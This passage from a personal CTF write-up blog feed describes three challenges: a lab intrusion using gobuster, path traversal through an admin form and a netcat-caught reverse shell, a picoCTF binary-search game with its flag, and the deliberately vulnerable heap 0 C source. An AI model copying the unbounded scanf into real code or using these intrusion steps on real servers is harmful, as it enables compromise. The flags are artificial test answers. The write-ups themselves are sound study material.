</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>/admin                <span style="color:#89dceb;font-weight:bold">(</span>Status: 200<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 1238<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>/assets               <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 179<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; /assets/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>/Content              <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 181<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; /Content/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>/Assets               <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 179<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; /Assets/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>/Modules              <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 181<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; /Modules/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>/Admin                <span style="color:#89dceb;font-weight:bold">(</span>Status: 200<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 1238<span style="color:#89dceb;font-weight:bold">]</span></span></span></code></pre></div>
<br>
<p>Navigating to other directories are not permitted except the <code>/admin</code>. Take a look at the text on the admin page: <code>As a reminder: use this form to activate modules from the /modules directory</code>. I already know that images are stored in <code>/content</code> not <code>/modules</code>. To access the images I uploaded on /content, I need to specify <code>../content/{the file of the image}.jpg</code> as we already saw in the gobuster output, both directories are in the same level.</p>
<p><img src="image-33.png#center" alt="alt text"></p>
<br>
<p>Now, run another gobuster command against the <code>/content</code> directory with the wordlist provided plus <code>-x</code> command to look for jpg files.</p>
<p><img src="image-35.png#center" alt="alt text"></p>
<br>
<p>As we can see, gobuster output changed our uploaded file name to <code>FNK.jpg</code> notice its size, it&rsquo;s realtively and small compared to to other files. Let&rsquo;s run our reverse-shell on the admin page.</p>
<p><img src="image-34.png#center" alt="alt text"></p>
<br>
<p>the netcat successfully captured the reverse-shell. I was able to change directory to <code>/var/www</code> and capture the flag.</p>
<p><img src="image-36.png#center" alt="alt text"></p>
]]></content:encoded>
    </item>
    <item>
      <title>[picoCTF] Binary Search</title>
      <link>http://localhost:1313/picoctf-binary-search/</link>
      <pubDate>Fri, 05 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/picoctf-binary-search/</guid>
      <description>Binary Search Description Want to play a game? As you use more of the shell, you might be interested in how they work! Binary search is a classic algorithm used to quickly find an item in a sorted list. Can you find the flag? You&amp;rsquo;ll have 1000 possibilities and only 10 guesses. Cyber security often has a huge amount of data to look through - from logs, vulnerability reports, and forensics.</description>
      <content:encoded><![CDATA[<h3 id="binary-search">Binary Search</h3>
<h4 id="description">Description</h4>
<p>Want to play a game? As you use more of the shell, you might be interested in how they work! Binary search is a classic algorithm used to quickly find an item in a sorted list. Can you find the flag? You&rsquo;ll have 1000 possibilities and only 10 guesses.
Cyber security often has a huge amount of data to look through - from logs, vulnerability reports, and forensics. Practicing the fundamentals manually might help you in the future when you have to write your own tools!</p>






<pre tabindex="0"><code>Welcome to the Binary Search Game!
I&#39;m thinking of a number between 1 and 1000.
Enter your guess: 500
Lower! Try again.
Enter your guess: 250
Higher! Try again.
Enter your guess: 375
Lower! Try again.
Enter your guess: 313
Lower! Try again.
Enter your guess: 282
Higher! Try again.
Enter your guess: 297
Lower! Try again.
Enter your guess: 289
Higher! Try again.
Enter your guess: 293
Congratulations! You guessed the correct number: 293
Here&#39;s your flag: picoCTF{g00d_gu355_2e90d29b}
Connection to atlas.picoctf.net closed.</code></pre>
<p><strong><em>flag</em></strong>: <code>picoCTF{g00d_gu355_2e90d29b}</code></p>
<hr>
<p>This one was fairly easy because I was already familiar with the Binary Search Algorithm.
Majoring in Computer Science finally paid off.. </p>
]]></content:encoded>
    </item>
    <item>
      <title>[picoCTF] heap 1 &amp; heap 0</title>
      <link>http://localhost:1313/picoctf-heap-0-1/</link>
      <pubDate>Fri, 05 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/picoctf-heap-0-1/</guid>
      <description>heap 0 Description Are overflows just a stack concern? Download the binary Download the source Here&amp;rsquo;s the source code provided
1#include &amp;lt;stdio.h&amp;gt; 2#include &amp;lt;stdlib.h&amp;gt; 3#include &amp;lt;string.h&amp;gt; 4 5#define FLAGSIZE_MAX 64 6// amount of memory allocated for input_data 7#define INPUT_DATA_SIZE 5 8// amount of memory allocated for safe_var 9#define SAFE_VAR_SIZE 5 10 11int num_allocs; 12char *safe_var; 13char *input_data; 14 15void check_win() { 16 if (strcmp(safe_var, &amp;#34;bico&amp;#34;) != 0) { 17 printf(&amp;#34;\nYOU WIN\n&amp;#34;); 18 19 // Print flag 20 char buf[FLAGSIZE_MAX]; 21 FILE *fd = fopen(&amp;#34;flag.</description>
      <content:encoded><![CDATA[<h3 id="heap-0">heap 0</h3>
<h4 id="description">Description</h4>
<p>Are overflows just a stack concern? <br>
Download the binary <br>
Download the source <br></p>
<hr>
<p>Here&rsquo;s the source code provided</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  1</span><span><span style="color:#6c7086;font-style:italic">#include</span> <span style="color:#6c7086;font-weight:bold;font-style:italic">&lt;stdio.h&gt;</span><span style="color:#6c7086;font-style:italic">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  2</span><span><span style="color:#6c7086;font-style:italic">#include</span> <span style="color:#6c7086;font-weight:bold;font-style:italic">&lt;stdlib.h&gt;</span><span style="color:#6c7086;font-style:italic">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  3</span><span><span style="color:#6c7086;font-style:italic">#include</span> <span style="color:#6c7086;font-weight:bold;font-style:italic">&lt;string.h&gt;</span><span style="color:#6c7086;font-style:italic">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  4</span><span><span style="color:#6c7086;font-style:italic"></span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  5</span><span><span style="color:#6c7086;font-style:italic">#define FLAGSIZE_MAX 64
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  6</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#6c7086;font-style:italic">// amount of memory allocated for input_data
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  7</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#6c7086;font-style:italic">#define INPUT_DATA_SIZE 5
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  8</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#6c7086;font-style:italic">// amount of memory allocated for safe_var
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  9</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#6c7086;font-style:italic">#define SAFE_VAR_SIZE 5
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 10</span><span><span style="color:#6c7086;font-style:italic"></span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 11</span><span><span style="color:#f38ba8">int</span> num_allocs;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 12</span><span><span style="color:#f38ba8">char</span> <span style="color:#89dceb;font-weight:bold">*</span>safe_var;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 13</span><span><span style="color:#f38ba8">char</span> <span style="color:#89dceb;font-weight:bold">*</span>input_data;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 15</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">check_win</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 16</span><span>    <span style="color:#cba6f7">if</span> (<span style="color:#89b4fa">strcmp</span>(safe_var, <span style="color:#a6e3a1">&#34;bico&#34;</span>) <span style="color:#89dceb;font-weight:bold">!=</span> <span style="color:#fab387">0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 17</span><span>        <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">YOU WIN</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 18</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 19</span><span>        <span style="color:#6c7086;font-style:italic">// Print flag
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 20</span><span><span style="color:#6c7086;font-style:italic"></span>        <span style="color:#f38ba8">char</span> buf[FLAGSIZE_MAX];
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 21</span><span>        FILE <span style="color:#89dceb;font-weight:bold">*</span>fd <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#89b4fa">fopen</span>(<span style="color:#a6e3a1">&#34;flag.txt&#34;</span>, <span style="color:#a6e3a1">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 22</span><span>        <span style="color:#89b4fa">fgets</span>(buf, FLAGSIZE_MAX, fd);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 23</span><span>        <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;%s</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>, buf);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 24</span><span>        <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 25</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 26</span><span>        <span style="color:#89b4fa">exit</span>(<span style="color:#fab387">0</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 27</span><span>    } <span style="color:#cba6f7">else</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 28</span><span>        <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;Looks like everything is still secure!</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 29</span><span>        <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">No flage for you :(</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 30</span><span>        <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 31</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 32</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 33</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 34</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">print_menu</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 35</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">1. Print Heap:</span><span style="color:#89b4fa">\t\t</span><span style="color:#a6e3a1">(print the current state of the heap)&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 36</span><span>           <span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">2. Write to buffer:</span><span style="color:#89b4fa">\t</span><span style="color:#a6e3a1">(write to your own personal block of data &#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 37</span><span>           <span style="color:#a6e3a1">&#34;on the heap)&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 38</span><span>           <span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">3. Print safe_var:</span><span style="color:#89b4fa">\t</span><span style="color:#a6e3a1">(I&#39;ll even let you look at my variable on &#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 39</span><span>           <span style="color:#a6e3a1">&#34;the heap, &#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 40</span><span>           <span style="color:#a6e3a1">&#34;I&#39;m confident it can&#39;t be modified)&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 41</span><span>           <span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">4. Print Flag:</span><span style="color:#89b4fa">\t\t</span><span style="color:#a6e3a1">(Try to print the flag, good luck)&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 42</span><span>           <span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">5. Exit</span><span style="color:#89b4fa">\n\n</span><span style="color:#a6e3a1">Enter your choice: &#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 43</span><span>    <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 44</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 45</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 46</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">init</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 47</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">Welcome to heap0!</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 48</span><span>    <span style="color:#89b4fa">printf</span>(
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 49</span><span>        <span style="color:#a6e3a1">&#34;I put my data on the heap so it should be safe from any tampering.</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 50</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;Since my data isn&#39;t on the stack I&#39;ll even let you write whatever &#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 51</span><span>           <span style="color:#a6e3a1">&#34;info you want to the heap, I already took care of using malloc for &#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 52</span><span>           <span style="color:#a6e3a1">&#34;you.</span><span style="color:#89b4fa">\n\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 53</span><span>    <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 54</span><span>    input_data <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#89b4fa">malloc</span>(INPUT_DATA_SIZE);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 55</span><span>    <span style="color:#89b4fa">strncpy</span>(input_data, <span style="color:#a6e3a1">&#34;pico&#34;</span>, INPUT_DATA_SIZE);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 56</span><span>    safe_var <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#89b4fa">malloc</span>(SAFE_VAR_SIZE);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 57</span><span>    <span style="color:#89b4fa">strncpy</span>(safe_var, <span style="color:#a6e3a1">&#34;bico&#34;</span>, SAFE_VAR_SIZE);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 58</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 59</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 60</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">write_buffer</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 61</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;Data for buffer: &#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 62</span><span>    <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 63</span><span>    <span style="color:#89b4fa">scanf</span>(<span style="color:#a6e3a1">&#34;%s&#34;</span>, input_data);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 64</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 65</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 66</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">print_heap</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 67</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;Heap State:</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 68</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;+-------------+----------------+</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 69</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;[*] Address   -&gt;   Heap Data   </span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 70</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;+-------------+----------------+</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 71</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;[*]   %p  -&gt;   %s</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>, input_data, input_data);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 72</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;+-------------+----------------+</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 73</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;[*]   %p  -&gt;   %s</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>, safe_var, safe_var);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 74</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;+-------------+----------------+</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 75</span><span>    <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 76</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 77</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 78</span><span><span style="color:#f38ba8">int</span> <span style="color:#89b4fa">main</span>(<span style="color:#f38ba8">void</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 79</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 80</span><span>    <span style="color:#6c7086;font-style:italic">// Setup
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 81</span><span><span style="color:#6c7086;font-style:italic"></span>    <span style="color:#89b4fa">init</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 82</span><span>    <span style="color:#89b4fa">print_heap</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 83</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 84</span><span>    <span style="color:#f38ba8">int</span> choice;
